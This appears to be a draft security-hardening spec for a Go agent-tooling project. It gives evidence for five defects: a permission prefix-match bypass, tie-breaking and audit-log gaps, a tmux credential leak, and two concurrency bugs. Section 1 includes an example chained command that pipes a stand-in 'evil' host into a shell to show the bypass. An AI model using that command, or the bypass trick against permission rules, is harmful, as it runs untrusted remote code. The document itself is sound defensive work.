---
id: SPEC-SEC-HARDEN-001
title: "Security & Concurrency Hardening — Research & Evidence"
version: "0.1.0"
status: draft
created: 2026-06-13
updated: 2026-06-13
author: GOOS행님
priority: P1
phase: "v3.0.0"
module: "internal/permission, internal/tmux, internal/lsp, internal/resilience, internal/cli/worktree"
lifecycle: spec-anchored
tags: "security, concurrency, research, evidence, cwe-214, prior-art"
era: V3R6
tier: L
---

# SPEC-SEC-HARDEN-001 — Research & Evidence

All evidence below was independently confirmed by reading the actual source at HEAD `0ef553617` during plan authoring.

## §1. M1 — Prefix-match command-chain bypass (verified)

`internal/permission/stack.go` `PermissionRule.Matches`, lines 125-129:
```go
// Check if input matches the argument pattern
// For patterns like "go test:*", check if input starts with "go test:"
if prefix, ok := strings.CutSuffix(argPattern, ":*"); ok {
    return strings.HasPrefix(input, prefix)
}
```
The match is prefix-only; the remainder of `input` is never inspected. An allow rule `Bash(go test:*)` therefore matches `go test ./...; curl evil|sh` — a chained destructive command rides in on the allowed prefix.

**Note on Claude Code parity**: Claude Code's own permission system uses similar prefix semantics. This SPEC does NOT attempt to fix Claude Code's matcher — it hardens MoAI's resolver against chained-command ride-along specifically. Documented here so run-phase does not over-reach into upstream semantics.

## §2. M2 — Conflict resolution (verified)

`internal/permission/conflict.go`:
- `specificityScore` (9-13): `100 - wildcards*10 + len(pattern)`.
- `resolveConflict` (26-55): loops candidate rules; `if score > bestScore` wins; `else if score == bestScore { if r.Origin > best.Origin { ... } }`. `Action` is never read. The `@MX:NOTE` (15-16) and doc comment (17-25) claim "conflicts are recorded in .moai/logs/permission.log" and cite REQ-V3R2-RT-002-042 AC-12.
- `logConflict` (57-68): builds `origins` (`r.Origin+":"+string(r.Action)`) then `_ = origins // Reserved for future log-file writes (currently silent).` — the promised audit write is absent.

Two defects: (1) deny does not win on an equal-specificity tie (resolves by `Origin` filesystem ordering), violating the security-standard "deny wins on tie"; (2) the conflict audit trail is silent, so a deny-override (or any conflict) is forensically invisible despite the documented AC-12.

## §3. M3 — tmux credential argv leak / CWE-214 (verified)

`internal/cli/worktree/tmux_integration.go`:
- Lines 77-84: in GLM/CG mode, `tmuxMgr.InjectEnv(ctx, cfg.GLMEnvVars)` is called on the FULL map.
- Lines 200-204 (within `BuildTmuxSessionConfig`): the map is populated by an `ANTHROPIC_` prefix filter — `if strings.HasPrefix(key, "ANTHROPIC_") { cfg.GLMEnvVars[key] = value }` — so `ANTHROPIC_AUTH_TOKEN` is included.

`internal/tmux/session.go` `InjectEnv` (189-203):
```go
// SECURITY: this method passes the value as a positional argv to `tmux
// set-environment`, which means the value is visible to any local process
// that can read /proc/<pid>/cmdline (Linux) or `ps -ef` output (macOS).
// For credentials use InjectSensitiveEnv instead.
func (m *DefaultSessionManager) InjectEnv(ctx context.Context, vars map[string]string) error {
    for key, value := range vars {
        args := []string{"set-environment", key, value}
        ...
```
The method's own doc declares the leak (CWE-214: Invocation of Process Using Visible Sensitive Information).

**Prior art — the canonical correct pattern** at `internal/cli/glm.go:389-408` (SPEC-V3R5-SECURITY-CRIT-001 P0-2):
```go
const sensitiveKey = "ANTHROPIC_AUTH_TOKEN"
if token := vars[sensitiveKey]; token != "" {
    if err := mgr.InjectSensitiveEnv(ctx, sensitiveKey, token); err != nil {
        return fmt.Errorf("inject sensitive tmux env: %w", err)
    }
    delete(vars, sensitiveKey)
}
if len(vars) == 0 { return nil }
return mgr.InjectEnv(ctx, vars)
```
The worktree `--team` path is a second entry point that skips this fix, re-leaking the token. `InjectSensitiveEnv` writes the value via a short-lived 0o700 script dir (`~/.moai/run/`, see `session.go:205-211` `sensitiveTempDir`) rather than argv, which is why the fallback-to-argv-on-failure must be forbidden.

## §4. M4 — LSP tracker data race (verified)

`internal/lsp/hook/tracker.go`:
- `GetBaseline` (69-84): `t.mu.RLock()` at line 71, `defer t.mu.RUnlock()` at 72, then `t.loadBaselineLocked()` at 74, then reads `t.baseline.Files[filePath]` at 78.
- `loadBaselineLocked` (112-130): early-returns if `t.baseline != nil` (114-116); otherwise reads the file, unmarshals, and writes `t.baseline = &baseline` at **line 128**.
- `CompareWithBaseline` (86-95) calls `GetBaseline` at 88.

`RWMutex.RLock` permits multiple concurrent readers. Two callers entering with `t.baseline == nil` both reach line 128 and concurrently assign `t.baseline` (write-write race) plus the read at line 78 races the write. Only `-race` flags this; `go vet`/golangci-lint miss it. Contrast `ClearBaseline` (98-110) and the (separately-shown) baseline writer, which correctly use `t.mu.Lock()`.

## §5. M5 — Circuit breaker invariant + unrecovered goroutine (verified)

`internal/resilience/circuit.go`:
- `Call` (61-97): doc comment line 63 states "If the circuit is half-open, only one request is allowed through." The body checks state under the lock (73-75), releases the lock, then runs `fn()` lock-free at line 83. There is no half-open in-flight permit field or check anywhere — the invariant is structurally absent. N concurrent half-open callers all execute `fn()`.
- `transitionTo` (181-198): line 196 `go cb.config.OnStateChange(oldState, newState)` with the `@MX:WARN` at 193-194:
  > OnStateChange callback invoked as goroutine while mutex is held by caller; panic in callback is unrecovered ... if OnStateChange panics, there is no recover() wrapper, which crashes the process; context cancellation is also not propagated
- `Reset` (108-121): calls `OnStateChange` **synchronously** at line 119 (different call site — out of M5's goroutine-recovery scope).

## §6. Methodology references

- **Reproduction-first / behavior preservation**: moai-workflow-tdd (RED demonstrates defect before fix) + moai-workflow-ddd (characterization tests for existing behavior). M4/M5 require `go test -race` per CLAUDE.local.md §6 ("go test -race ./... for concurrency safety on any code touching goroutines or channels").
- **CWE-214**: Invocation of Process Using Visible Sensitive Information — credential passed as a process argument is visible via `/proc/<pid>/cmdline` and `ps -ef`.
- **Test isolation**: M2's `permission.log` write tests MUST use `t.TempDir()`-rooted log directories (CLAUDE.local.md §6) — no writes to the real project tree.
- **@MX tag protocol** (`.claude/rules/moai/workflow/mx-tag-protocol.md`): M2 and M5 update existing `@MX:NOTE`/`@MX:WARN` tags to reflect the implemented behavior; a `@MX:WARN` whose danger is eliminated is removable/demotable.

## §7. Line-citation confidence

| Citation | Prompt | Verified | Match |
|----------|--------|----------|-------|
| M1 `stack.go:127-128` | 127-128 | 127-128 | exact |
| M2 `conflict.go:26-55` | 26-55 | 26-55 | exact |
| M2 `conflict.go:57-68` | 57-68 | 57-68 | exact |
| M3 `tmux_integration.go:78-84` | 78-84 | 77-84 (block incl. the `if` at 77) | confirmed; `InjectEnv` call at 80 |
| M3 `tmux_integration.go` token filter | ~201 | 200-204 (`ANTHROPIC_` filter) | confirmed |
| M3 `session.go:189-203` | 189-203 | 189-203 | exact |
| M3 `glm.go:389-408` | 389-408 | 389-408 | exact |
| M4 `tracker.go:70-84` GetBaseline | 70-84 | 69-84 (func at 69) | confirmed; RLock at 71 |
| M4 `tracker.go:113-130` loadBaselineLocked | 113-130 | 112-130 (func at 112) | minor off-by-one; write at line 128 exact |
| M5 `circuit.go:64-96` Call | 64-96 | 61-97 (func at 61, body 64-96) | confirmed |
| M5 `circuit.go:183-198` transitionTo | 183-198 | 181-198 (func at 181) | confirmed; goroutine at 196 |

**Unconfirmed / for GATE-2 resolution**: none of the defects is unconfirmed. The only deltas from the spawn prompt's line numbers are function-start off-by-one differences (M4 loadBaselineLocked 112 vs 113; M3 block start 77 vs 78; M5/M2/M1 exact). All cited code snippets and the defects themselves are confirmed present.
